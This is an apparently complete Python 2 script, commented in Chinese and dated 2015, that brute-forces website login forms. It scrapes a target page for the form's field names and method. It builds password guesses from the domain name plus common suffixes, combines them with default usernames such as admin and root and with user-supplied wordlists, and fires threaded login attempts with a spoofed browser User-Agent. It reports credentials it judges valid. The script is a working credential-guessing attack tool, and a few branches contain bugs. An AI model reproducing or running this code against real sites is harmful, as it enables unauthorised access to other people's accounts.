#!/usr/bin/env python
#-*-coding:utf-8-*-
'''
author:jaffer tsao
time:2015-1-19
function:readme
'''

import httplib2
from string import replace,find,lower
from urlparse import urlparse,urljoin
from urllib import urlencode
import os
import sys
#同目录下的threadpool.py
import threadpool
import progressbar

import pdb


#需要url
class parseUrl(object):
	def __init__(self,url):
		self.url = url
		self.submitUrl = ''
		self.method = 'get'
		self.user = ''
		self.passwd = ''
		self.list = []

	def getMthod(self):
		return self.method
		#www.baidu.com 获取baidu.如果是www.baidu.test.com,返回baidu和test
	def getHostList(self):
		url_test_path = urlparse(self.url)
		host = url_test_path.netloc
		loc1 = host.find('.',0,-1)
		loc2 = host.find('.',loc1+1,-1)
		while (loc2 != -1):
			self.list.append(host[loc1+1:loc2])
			loc1 = loc2
			loc2 = host.find('.',loc1+1,-1)
		return self.list
	def getsubmitUrl(self):
		url_test_path = urlparse(self.url)
		self.submitUrl = 'http://'+url_test_path.netloc+self.submitUrl
		return self.submitUrl
	def getUser(self):
		return self.user
	def getPasswd(self):
		return self.passwd
	#url:http://www.test.com/*****
	def parsePage(self):
		try:
			h = httplib2.Http()
			res,con = h.request(self.url,'GET')
		except:
			return
		df = con.find('<form ')
		if df != -1:
			#print 'form OK\n'
			#从df开始向后查找,找url
			da = con.find('action=',df,-1)
		 	if da != -1:
				#print 'action ok\n'
				db = con.find('"',da+8,-1)
				dx = con.find('/',da,db)
				#没找到'/'需要自己添加
				if dx == -1:
					dx = db+8
				self.submitUrl = con[dx:db]
				#print self.submitUrl+'---submitUrl----\n'
			#找method
			dm = con.find('method=',df,-1)
			if dm != -1:
				#print 'method OK\n'
				dmj = con.find('"',dm+8,-1)
				self.method = con[dm+8:dmj]
				#print self.method+'----self.method--\n'
			#找username,找到<input ...../>之间的内容
			du = con.find('<input',df,-1)
			due = con.find('>',du,-1)
			while (du != -1 and due != -1 and due > du):
				#print 'input OK\n'
				dt = con.find('type="text"',du,due)
				dtp = con.find('type="password"',du,due)
				if dt != -1:
					#print 'type ok\n'
					#找name
					dn = con.find('name=',du,due)
					if dn != -1:
						dnj = con.find('"',dn+6,due)
						self.user = con[dn+6:dnj]
						#print self.user+'--self.user--\n'
						du = con.find('<input',due,-1)
						due = con.find('>',du,-1)
						#self.flag = 1
				#找paassword
				elif dtp != -1:
					#print 'password OK\n'
					dn = con.find('name=',du,due)
					if dn != -1:
						dpj = con.find('"',dn+6,due)
						self.passwd = con[dn+6:dpj]
						#print self.passwd+'--self.passwd--\n'
						du = con.find('<input',due,-1)
						due = con.find('>',du,-1)
				else:
					du = con.find('<input',due,-1)
					due = con.find('>',du,-1)

#需要域名list
class passCreateFromUrl(object):
	def __init__(self,list):
		self.hostlist = list
		self.passlist = []
		self.houzui = ['123','cba','123456','1','12','123123','123321','123abc','abc','abcdef','`123','a','ab','a1b2c3','1a2b3c','love','520','1314','666666','888888','654321','321']

	'''
	根据host来构造用户名或者密码
	1 逆序   s=s[::-1]
	2 含分隔符
	3 加一些简单的数字
	4 加简单的字母
	5 重复两遍 bbaadduu..ccoomm baidubaidu
	6 先单后双，先双后单
	'''
	def getReverse(self,url_host):
		hostr = url_host[::-1]
		self.passlist.append(hostr)
		self.passlist.append(url_host)
		for i in range(len(self.houzui)):
			self.passlist.append(hostr+self.houzui[i])
			self.passlist.append(url_host+self.houzui[i])

	def getDouble(self,url_host):
		temp = ''
		temp2 = ''
		fenge = ['.','#',',',';','-','1','a','+','\'','/','']
		#得到bbaadduu
		for i in range(len(url_host)):
			temp = temp + url_host[i] + url_host[i]
			temp2 = temp2 + url_host[i] + fenge[0]
		self.passlist.append(temp)
		self.passlist.append(temp2)
		#得到分隔符，b1a1i1d1u1
		for j in range(len(fenge)):
			if j == 0:
				continue
			temp2.replace(fenge[0],fenge[j])
			self.passlist.append(temp2)
		#baidubaidu
		self.passlist.append(url_host+url_host)

	def getPasswdFromUrl(self):
		for i in range(len(self.hostlist)):
			self.getReverse(self.hostlist[i])
			self.getDouble(self.hostlist[i])
		return self.passlist
#需要密码txt文档
class passCreateFromFile(object):
	def __init__(self,fp):
		self.fp = fp
		self.passfromfile = []

	def getPassFile(self):
		#判断该fp是否打开成功。
		try:
			#遍历每一行
			for line in self.fp:
				#去除最后一个\n
				line = line[0:-1]
				self.passfromfile.append(line)
			return self.passfromfile
		except:
			return self.passfromfile

#需要将域名list传入进来
class getUser(object):
	def __init__(self,host,fp):
		self.user = ['admin','test','root','mysql','tty','guest','admin1','toor','seoadmin']
		self.hostname = host
		self.userf = []
		self.fp = fp

	def getUsernamefromHost(self):
		for i in range(len(self.hostname)):
			self.user.append(self.hostname[i])
			self.user.append(self.hostname[i][::-1])
		return self.user
	def getUsernamefromFile(self):
		#对fp一场进行处理
		try:
			for line in self.fp:
				line = line[0:-1]
				self.userf.append(line)
			return self.userf
		except:
			return self.userf


	'''
	#发送数据包
	url:要发送的地址（通过解析得到的）
	method:发送方式
	user:用户名列表
	passwdfromurl：根据url得到的密码列表
	passwdfromfile:根据用户选择的文件得到的密码列表
	getuser:网页显示用户名别称
	getpasswd:网页显示密码别称
	errorWord:自定义错误关键字，如果用户没有定义，就看返回长度
	self.success：
	'''
class sendP(object):
	def __init__(self,url,method,user,passwdfromurl,passwdfromfile,getuser,getpasswd,threadnum,errorWord=''):
		self.user = user
		self.passwdurl = passwdfromurl
		self.passwdfile = passwdfromfile
		self.url = url
		self.method = method
		#网页上显示的用户密码
		self.getuser = getuser
		self.getpasswd = getpasswd
		self.error = errorWord
		#10个线程池
		self.threadnum = threadnum
		self.baselen = 0
		self.len = 0
		self.presuccess = []
		self.temp = []
		self.success = ''

		'''
		get 方式进行请求数据，应该这样做
		'''
	def getData(self,username,passlist):
		for i in range(len(passlist)):
			#print '******\n'
			h = httplib2.Http()
			get_url = self.url + '?' + self.getuser + '=' + username + '&' + self.getpasswd + '=' + passlist[i]
			res,con = h.request(get_url,self.method.upper())
			if res['status'] == '302':
				self.url = res['Location']
				get_url = self.url + '?' + self.getuser + '=' + username + '&' + self.getpasswd + '=' + passlist[i]
				res,con = h.request(get_url,self.method.upper())
			#用户自定义了错误关键字
			if self.error != '':
				if con.find(self.error) != -1:
					continue
				else:
					self.temp.append(username)
					self.temp.append(passlist[i])
					success_list.append(self.temp)
			#没有定义错误关键字，下面是用长度来做判断
			else:
				if self.baselen == 0:
					self.baselen = len(con)
					self.presuccess.append(passlist[i])
				else:
					if self.baselen != len(con) and self.len == 0:
						self.len = len(con)
						self.presuccess.append(passlist[i])
					#开始两个长度都一样了，这个时候早就下一个啦。
					elif self.baselen == len(con) and self.len ==0:
						continue
					#出现3个长度结果，认为不能依靠返回长度来判断了，因此失败.
					elif self.baselen != len(con) and self.len != 0 and self.len != len(con):
						break
					#找到可能的密码
					elif self.baselen != len(con) and self.len !=0 and self.len ==len(con):
						self.success = self.presuccess[0]
						self.temp.append(username)
						self.temp.append(self.success)
						success_list.append(self.temp)
						break
					elif self.baselen == len(con) and self.len !=0 and self.len !=len(con):
						self.success = self.presuccess[1]
						temp.append(username)
						temp.append(self.success)
						success_list.append(temp)
						break
		return self.success

	'''
	username 是一个字符串
	passlist是一个序列。
	一个线程对应一个用户名。
	返回success，没有话success为空
	'''
	def postData(self,username,passlist):
		for i in range(len(passlist)):
			#print '---\n'
			h = httplib2.Http()
			data = {self.getuser:username,self.getpasswd:passlist[i]}
			headers = {
			"Accept-Encoding": "gzip, deflate",
			"Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
			"Cache-Control": "no-cache",
			"Connection": "keep-alive",
			"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			"Pragma": "no-cache",
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
			}
			#pdb.set_trace()
			#记住method必须大写
			res,con = h.request(self.url,self.method.upper(),headers=headers,body=urlencode(data))
			if res['status'] == '302':
				self.url = res['Location']
				res,con = h.request(self.url,self.method.upper(),headers=headers,body=urlencode(data))
			#用户自定义了错误关键字
			if self.error != '':
				if con.find(self.error) != -1:
					continue
				else:
					self.temp.append(username)
					self.temp.append(passlist[i])
					success_list.append(self.temp)
			#没有定义错误关键字，下面是用长度来做判断
			else:
				if self.baselen == 0:
					self.baselen = len(con)
					self.presuccess.append(passlist[i])
				else:
					if self.baselen != len(con) and self.len == 0:
						self.len = len(con)
						self.presuccess.append(passlist[i])
					#开始两个长度都一样了，这个时候早就下一个啦。
					elif self.baselen == len(con) and self.len ==0:
						continue
					#出现3个长度结果，认为不能依靠返回长度来判断了，因此失败.
					elif self.baselen != len(con) and self.len != 0 and self.len != len(con):
						break
					#找到可能的密码
					elif self.baselen != len(con) and self.len !=0 and self.len ==len(con):
						self.success = self.presuccess[0]
						self.temp.append(username)
						self.temp.append(self.success)
						success_list.append(self.temp)
						break
					elif self.baselen == len(con) and self.len !=0 and self.len !=len(con):
						self.success = self.presuccess[1]
						temp.append(username)
						temp.append(self.success)
						success_list.append(temp)
						break
		return self.success
	'''
	此处是用来判断，提交数据是post还是get，如果不一样，处理方式就必须不一样。参数跟postData一样
	'''
	def sendData(self,username,passlist):
		if self.method.upper() == 'POST':
			self.postData(username,passlist)
		if self.method.upper() == 'GET':
			self.getData(username,passlist)


	def gothread(self):
		#建立进程池
		pool = threadpool.ThreadPool(self.threadnum)
		print type(self.threadnum)
		print self.threadnum
		#两个list合并，直接相加就可以
		for i in range(len(self.user)):
			pool.add_task(self.sendData,self.user[i],self.passwdfile+self.passwdurl)
		#join and destroy all threads
		pool.destroy()




if __name__ == '__main__':
	#得到脚本目录
	baseloc = sys.path[0]
	url = raw_input('please input the url:\n')
	#该文件必须在本目录下
	userfilename = raw_input('please input the user filename(user.txt for default):\n')
	passfilename = raw_input('please input the passwd filename(pass.txt for default):\n')
	errorkey = raw_input('please input the error key(if it is null,we will use the length of response to judge):\n')
	threadnum = raw_input('please input the threadpool size(5 for default):\n')
	posturl = raw_input('please input the post url(if you donnot type in,I will analyse the url instead,but maybe not success):\n')
	postname = raw_input('please input the post username(just like the below):\n')
	postpass = raw_input('please input the post passname(just like the below):\n')
	test = parseUrl(url)
	if userfilename == '':
		userfilename = 'user.txt'
	if passfilename == '':
		passfilename = 'pass.txt'
	if threadnum == '':
		threadnum = 5
	#判断fp是否open成功，在具体的函数时候判断，因为即使不成功，我们也需要运行程序，只是不要这个数据罢了，用url自己变异的密码或用户
	pass_fp = open(baseloc+'\\'+passfilename,'r')
	user_fp = open(baseloc+'\\'+userfilename,'r')
		
	#用来存放正确的用户名以及密码，列表里面还是列表，有2个元素，第一个是用户名，第二是密码。
	#比如，[['admin','12346'],['root','abc']]
	global success_list
	success_list = []
	#解析url
	test.parsePage()
	method = test.getMthod()
	hostlist = test.getHostList()
	#如果没有指定提交的url以及user和name,那么我们会根据分析的结果来处理,如果提交了,那么就以提交的为准。
	#这是为了来处理目前还不能处理的一些内容
	if posturl == '':
		suburl = test.getsubmitUrl()
	else:
		suburl = posturl
	if postname == '':
		userp = test.getUser()
	else:
		userp = postname
	if postpass == '':
		passp = test.getPasswd()
	else:
		passp = postpass
	
	passwordC = passCreateFromUrl(hostlist)
	passwordF = passCreateFromFile(pass_fp)
	userAll = getUser(hostlist,user_fp)
	#得到url密码
	passwdfromurl = passwordC.getPasswdFromUrl()
	passwdfromfile = passwordF.getPassFile()
	#得到user
	userfromhost = userAll.getUsernamefromHost()
	userfromfile = userAll.getUsernamefromFile()
	#数据发送
	go = sendP(suburl,method,userfromhost+userfromfile,passwdfromurl,passwdfromfile,userp,passp,threadnum,errorkey)
	go.gothread()

	#做一些善后工作
	pass_fp.close()
	user_fp.close()

	#输出结果
	if len(success_list) == 0:
		print '\nsorry,the password and username maybe strong!\n'
	else:
		print '\ngood,we get the username and password!\n'
		for i in range(len(success_list)):
			print 'user:'+success_list[i][0]
			print '\npass:'+success_list[i][1]+'\n\n'
	raw_input('input anything to continue:\n')

